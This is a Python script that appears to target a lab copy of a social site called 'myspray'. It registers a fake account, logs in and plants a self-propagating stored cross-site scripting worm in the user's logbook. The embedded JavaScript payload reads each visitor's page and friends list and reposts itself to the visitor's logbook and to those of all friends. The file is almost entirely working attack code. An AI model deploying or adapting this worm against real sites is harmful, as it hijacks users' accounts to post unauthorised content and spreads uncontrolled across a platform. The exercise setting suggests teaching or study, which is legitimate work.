import requests
import re

s = requests.Session()

baseurl = 'http://10.0.23.22/myspray/'

script = '''<script>var w=document.currentScript;var n=new XMLHttpRequest;n.open('GET','mypage.html',true);n.onreadystatechange=function(){if(n.readyState===4){if(n.status==200){var t=document.createElement('html');t.innerHTML=n.response;var e=new XMLHttpRequest;e.open('POST','post'+t.querySelector('#profileImage').src.split('/').slice(-2)[0]+'.html',true);var r=new FormData;r.append('entry','This page is infected!<script>'+w.innerHTML+'<\\/script>');e.send(r)}}};n.send();var e=new XMLHttpRequest;e.open('GET','myfriends.html',true);e.onreadystatechange=function(){if(e.readyState===4){if(e.status==200){var t=document.createElement('html');t.innerHTML=e.response;t.querySelectorAll('.Image a').forEach(function(t){var e=new XMLHttpRequest;e.open('POST',t.href.split('/').slice(-1)[0].replace('profile','post'),true);var r=new FormData;r.append('entry','This page is infected!<script>'+w.innerHTML+'<\\/script>');e.send(r)})}}};e.send();</script>'''

#form data for user registry
register_data = {
'first_name': 'Infected', 
'last_name': 'User',
'city': '',
'gender': '',
'birthdayYear': '',
'face': '',
'motivation': '',
'tag':'',
'skill':'',
'style':'',
'jabber':'',
'email': 'infected@user.com',
'website':'',
'job':'',
'interests':'',
'aboutme':'',
'password': '12345678',
'passwordRepeat': '12345678'
}

#request to register on myspray
response = s.post(baseurl + 'register.html', data = register_data)

#regex to look for meta redirects
regex = re.compile('<meta[^>]*?url=(.*?)["\']', re.IGNORECASE)

match = regex.search(response.text)

while match: #loop for redirecting until logged in
    response = s.get(baseurl + match.groups()[0].strip())
    match = regex.search(response.text)

m = re.search('media/member/(.+?)/face', response.text)
if m:
    uid = m.group(1)

# post worm on user's logbook
response = s.post(baseurl + 'post' + uid + '.html', data = { 'entry' : "Infected!" + script})

print "Infected user created!"